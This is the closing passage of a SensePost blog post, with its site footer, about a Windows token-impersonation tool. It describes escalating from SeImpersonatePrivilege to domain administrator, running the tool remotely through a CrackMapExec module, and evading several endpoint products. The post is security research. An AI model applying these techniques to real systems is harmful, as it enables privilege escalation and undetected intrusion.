<p>However, since you have the SeImpersonatePrivilege you can escalate to domain administrator. </p>



<p>Finally a <a href="https://github.com/sensepost/impersonate/blob/main/impersonate.py" data-type="URL" data-id="https://github.com/sensepost/impersonate/blob/main/impersonate.py">CrackMapExec module</a> was also released allowing you to use this tool remotely on a server. The module should be released in a few days (see <a href="https://github.com/Porchetta-Industries/CrackMapExec/pull/601" data-type="URL" data-id="https://github.com/Porchetta-Industries/CrackMapExec/pull/601">the following PR</a>)</p>



<h2 class="wp-block-heading"><strong>X/ Conclusion</strong></h2>



<p>What mesmerizes me the most with the token exploit mechanism is that it allows us not to rely on the LSASS process. Since we can usurp users’ primary token and use them remotely we don’t need to find their credentials anymore which limits the detection. So far we have tested the Impersonate binary against McAfee, Trellix, SentinelOne and Windows Defender. None of them blocked it. Considering that this article is already way too long (sorry for that) I will not write about possible remediation mechanisms but may be I’ll do that on a future blog post.</p>



<p>Happy hacking!</p>

    </div>


    

  </article>

</div>

    </div>

    
      <footer class="footer contentblock contentblock--dark contentblock--center contentblock--img contentblock--form" role="contentinfo">


   <div class="container">

    <h2 class="contentblock__heading contentblock__heading--lg contentblock__heading_footerh2">Get in touch with us</h2>
      <a class="contactemail" href="mailto:sensepost@orangecyberdefense.com">sensepost@orangecyberdefense.com</a>

	<p class="contentblock__txt">
		Please select your enquiry type, and we'll get back to you as soon as possible

	</p>

	



<form id="contact_form" onsubmit="return false;">
    <div class="col-md-3 col-sm-3 col-xs-12 pLR7 marginB15">
        <div class="list-select1-div">
            <select id="contact_interest">
                <option value="General">General</option>
                <optgroup label="Services">
                    <option value="Security Assessments">Security Assessments</option>
                    <option value="Hacking Training">Hacking Training</option>
                    <option value="Managed Services">Managed Services</option>
                </optgroup>
                <optgroup label="Training">
                    <option value="Hands On Hacking  Fundamentals">Hands On Hacking Fundamentals</option>
                    <option value="Web Application Hacking">Web Application Hacking</option>
                    <option value="Infrastructure Hacking">Infrastructure Hacking</option>
                    <option value="Introduction to Red Teaming">Introduction to Red Teaming</option>
                    <option value="Unplugged; Modern WiFi Hacking">Unplugged; Modern WiFi Hacking</option>
                </optgroup>
                <option value="Careers">Careers</option>
            </select>
        </div>
    </div>
    <div class="col-md-3 col-sm-3 col-xs-12 pLR7 marginB15">
        <input id="contact_name" type="text" placeholder="Name" class="txtFd-style" required="">
    </div>
    <div class="col-md-3 col-sm-3 col-xs-12 pLR7 marginB15">
        <input id="contact_email" type="text" placeholder="Email address" class="txtFd-style" required="">
    </div>
    <div class="col-md-3 col-sm-3 col-xs-12 pLR7 marginB15">
        <input id="contact_number" type="text" placeholder="Contact Number" class="txtFd-style" required="">
    </div>

    <div class="col-md-9 col-sm-9 col-xs-12 pLR7 marginB15">
        <textarea id="contact_msg" placeholder="Your message" class="txtArea-style" required=""></textarea>
    </div>
    <div class="col-md-3 col-sm-3 col-xs-12 pLR7 marginB15">
        <button id="contact_button" type="submit" class="btn-submite-syle">Get in touch</button>
    </div>
    <div class="col-md-12 col-sm-12 col-xs-12 pLR7">
        <h6>By clicking ‘Get in touch’ you agree to Orange Cyberdefense's <a href="https://orangecyberdefense.com/global/general-terms-and-conditions/" target="_blank">Terms of
                Service</a></h6>
        <div class="msgPosition">
            <span id="emailMsg" class="msgAbsolute errorTxt"></span>
        </div>
    </div>

</form>
<script type="text/javascript">
    $(function () {
        $('#contact_button').click(function () {
            postContact();
        });
    });


    onclick = "javascript:postContact();"

    var contact_form_sending = 0;
    function postContact() {
        $("#emailMsg").html("");

        if ($("#contact_interest").val().length == 0) return;
        if ($("#contact_name").val().length == 0) return;
        if ($("#contact_email").val().length == 0) return;
        if ($("#contact_number").val().length == 0) return;
        if ($("#contact_msg").val().length == 0) return;
        if (validateEmail() == false) return;

        if (contact_form_sending == 1) return;
        contact_form_sending = 1;

        // var template_id = "mh_orange_cyber_defense";
        // var service_id = "default_service";
        // var user_id = "user_p2d6cz5KWui6AlQoDVzkY";

        var template_id = "sales";
        var service_id = "default_service";
        var user_id = "user_NZJsWplZbDmNJpdi8Q9sh";

        if ($.inArray($("#contact_interest").val(), ["Security Assessments", "Hacking Training", "Managed Services"]) >= 0) {
            template_id = "sales";
        }
        else if ($.inArray($("#contact_interest").val(), ["Hands On Hacking  Fundamentals", "Web Application Hacking", "Infrastructure Hacking", "Introduction to Red Teaming", "Unplugged; Modern WiFi Hacking"]) >= 0) {
            template_id = "sales";
        }
        else if ($("#contact_interest").val() == "Careers") {
            template_id = "jobs";
        }

        var data = {
            "service_id": service_id,
            "template_id": template_id,
            "user_id": user_id,
            "template_params": {
                "interest": $("#contact_interest").val(),
                "name": $("#contact_name").val(),
                "mobile": $("#contact_number").val(),
                "email": $("#contact_email").val(),
                "message": "[This is a test, please ignore it]<br>" + $("#contact_msg").val()
            }
        };

        var contact_button_text = $("#contact_button").html();
        $("#contact_button").html(contact_button_text + "...");


        $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
            type: 'POST',
            data: JSON.stringify(data),
            contentType: 'application/json'
        }).done(function () {
            contact_form_sending = 0;
            $("#contact_button").html(contact_button_text);

            $("#emailMsg").removeClass("errorTxt");
            $("#emailMsg").addClass("successTxt");

            $("#emailMsg").html("<p>Thank you for contacting us!</p>");

        }).fail(function (error) {
            contact_form_sending = 0;
            $("#contact_button").html(contact_button_text);
            $("#emailMsg").removeClass("successTxt");
            $("#emailMsg").addClass("errorTxt");

            $("#emailMsg").html("<p>Oops! Something went wrong, please try again after Sometime.</p>");
            // alert('Oops... ' + JSON.stringify(error));
        });

        function validateEmail() {
            if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test($("#contact_email").val())) {
                return (true)
            }

            $("#emailMsg").removeClass("successTxt");
            $("#emailMsg").addClass("errorTxt");
            $("#emailMsg").html("<p>You have entered an invalid email address!</p>");

            return (false)
        }
    }
</script>
  </div>



  <div class="site-info container clearfix">

    <div class="row row--4">

      <!-- Contact Details -->
      

        <div class="contact contact--footer contact--footer--tel vcard col">
          <h4 class="contact__heading fn org">

              <span class="visuallyhidden">Orange Cyberdefense </span>Pretoria (Head Office)

          </h4>

          
          <div class="contact__tel tel">
            <a href="tel:+27124600880">

              +27 (0)12 460 0880
            </a>
          </div>
          

		  
          <div class="contact__adr">



              Park Lane West, 197 Amarand Ave, Waterkloof Glen, Pretoria, South Africa

          </div>
          


        </div>

      

        <div class="contact contact--footer contact--footer--tel vcard col">
          <h4 class="contact__heading fn org">

              <span class="visuallyhidden">Orange Cyberdefense </span>London (Head Office)

          </h4>

          
          <div class="contact__tel tel">
            <a href="tel:+442070781360">

              +44 (0)2070 781 360
            </a>
          </div>
          

		  
          <div class="contact__adr">



              SensePost, 250 Waterloo Road, SE1 8RD, London, United Kingdom

          </div>
          


        </div>

      

        <div class="contact contact--footer contact--footer--tel vcard col">
          <h4 class="contact__heading fn org">

              <span class="visuallyhidden">Orange Cyberdefense </span>Cape Town

          </h4>

          
          <div class="contact__tel tel">
            <a href="tel:+27124600880">

              +27 (0)12 460 0880
            </a>
          </div>
          

		  
          <div class="contact__adr">



              183 Albion Springs Corner Main Road &amp;, Albion Springs Cl,, Rondebosch, Cape Town, South Africa

          </div>
          


        </div>

      


      <div class="contact contact--footer contact--social col">
        <!-- Social -->
        <div class="contact__social">
    <a href="//www.linkedin.com/company/sensepost" class="contact__social__item contact__social__item--first icon" title="Linked In" target="_blank">
        <span class="visuallyhidden">Linked In</span>
        


  


<svg class="linkedinsvg" baseProfile="tiny" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 25 25" width="25" height="25"><path class="linkedinsvg__path" fill="#616161" d="M18.7 24v-8.2c0-2.1-.6-3.4-2.5-3.4-1.4 0-2.4.9-2.8 1.9-.1.3-.4.7-.4 1.2V24H7.9S8 9.5 7.9 7.9h5.2v3s.2 0 .2.1h.2c.7-1 2.3-2.9 5-2.9 3.4 0 5.5 2.6 5.5 7.3V24h-5.3zM0 7.9h5.2L5.4 24H0V7.9zm2.7-2.6C1.2 5.3 0 4.1 0 2.6S1.3 0 2.7 0s2.7 1.2 2.7 2.7-1.2 2.6-2.7 2.6z"></path></svg>

    </a>

    <a href="/rss.xml" class="contact__social__item icon" title="RSS Feed" target="_blank">
        <span class="visuallyhidden">RSS Feed</span>
        


  


<svg class="rsssvg" baseProfile="tiny" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path class="rsssvg__path" fill="#616161" d="M0 0v5.4c5.1 0 9.8 2.1 13.2 5.5 3.4 3.4 5.5 8 5.5 13.2H24C24 10.7 13.3 0 0 0zm0 8.4v5.4c5.6 0 10.2 4.6 10.2 10.2h5.4c0-8.6-7-15.6-15.6-15.6zm3 9.7c-1.6 0-3 1.3-3 3s1.3 3 3 3 3-1.3 3-3-1.4-3-3-3z"></path></svg>

    </a>
</div>

      </div>
          <a class="mainnav__aside"><img src="/img/components/logo/creds_logos.png" align="right"></a>
    </div> <!-- row -->


    <div class="copyright">
      © Orange Cyberdefense 2024
    </div>

  </div><!-- .site-info -->
</footer>


    

  </div>


  <script src="/scripts/main.js"></script>



  

    <script type="text/javascript">
  require(['/scripts/require.common.js'], function (common) {
    require([
      '/scripts/pages/submenu/submenu.require.js',
      '/scripts/pages/blog/blog.require.js'
    ]);
  });
</script>


  




  <!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
<script>
  (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
  function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
  e=o.createElement(i);r=o.getElementsByTagName(i)[0];
  e.src='//www.google-analytics.com/analytics.js';
  r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
  ga('create','UA-50942626-1');ga('send','pageview');
</script>


  

</body></html>